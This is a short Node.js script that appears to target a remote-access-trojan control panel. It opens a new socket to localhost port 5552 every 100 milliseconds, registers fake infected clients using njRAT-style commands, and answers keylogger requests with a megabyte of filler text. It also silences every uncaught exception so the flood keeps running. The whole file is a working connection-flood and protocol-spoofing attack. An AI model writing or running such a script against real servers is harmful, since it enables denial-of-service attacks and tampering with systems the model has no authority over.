setInterval(() => {
  const net = require('net')
  const { formatCMD, btoa } = require('./utils')

  const port = 5552
  const host = 'localhost'

  const client = new net.Socket()
  client.connect(port, host, () => {
    console.log('Connected')
    client.write(formatCMD({
      name: 'll',
      params: [
        btoa('Discord: Bee#1111'),
        'lol' + Math.random(),
        'Discord: Bee#1111',
        '01-01-97',
        '',
        'Discord: Bee#1111',
        'No',
        '0.0.1',
        '1ms',
        btoa('Discord: Bee#1111'),
        `fodase`
      ]
    }))
    client.write(formatCMD({
      name: 'inf',
      params: [
        btoa('Discord: Bee#1111')
      ]
    }))
    client.write(formatCMD({
      name: 'kl',
      params: [
        btoa('kk eae irmaozinho\nDiscord: Bee#1111')
      ]
    }))
  })

  client.on('data', data => {
    const dataString = data.toString()
    console.log('received: ', dataString)

    // keep alive
    if (dataString === '0') {
      client.write(Buffer.from('3000', 'hex'))
    }

    const msg = dataString.split('\x00')[1]
    const command = msg.split("|'|'|")[0]
    const args = msg.split("|'|'|")
    args.shift()
    console.log(command, args)

    // Keylogger
    if (command === 'kl') {
      client.write(formatCMD({
        name: 'kl',
        params: [
          btoa('a'.repeat(1000000))
        ]
      }))
    }
  })
}, 100)

process.on('uncaughtException', () => {
})
